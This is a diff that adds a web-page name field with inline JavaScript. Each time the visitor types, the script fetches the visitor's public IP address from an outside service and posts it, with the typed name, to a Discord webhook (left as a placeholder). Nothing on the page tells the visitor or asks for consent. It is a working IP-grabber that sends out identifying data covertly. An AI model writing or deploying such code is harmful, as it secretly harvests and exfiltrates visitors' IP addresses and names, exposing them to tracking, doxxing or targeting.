@@ -1,0 +1,39 @@
+  <label for="username">Name or Username:</label>
+  <input type="text" id="username" placeholder="Name or Username">
+
+  <script>
+    let typingTimeout;
+    
+    function sendMessage() {
+      clearTimeout(typingTimeout);
+      typingTimeout = setTimeout(() => {
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            const ipAddress = data.ip;
+            console.log(ipAddress);
+
+            const usernameInput = document.getElementById('username');
+            const username = usernameInput.value.trim();
+            const namePart = username ? ` Name: ${username}` : '';
+
+            // Send Discord message via webhook
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+            const message = `IP Address: ${ipAddress}${namePart}`;
+
+            fetch(webhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({ content: message })
+            })
+            .then(response => console.log('Discord message sent successfully'))
+            .catch(error => console.error('Error sending Discord message:', error));
+          });
+      }, 1000); // 1000 milliseconds (1 second) cooldown before sending
+    }
+
+    // Automatically send the message after a cooldown when the user types
+    document.getElementById('username').addEventListener('input', sendMessage);
+  </script>
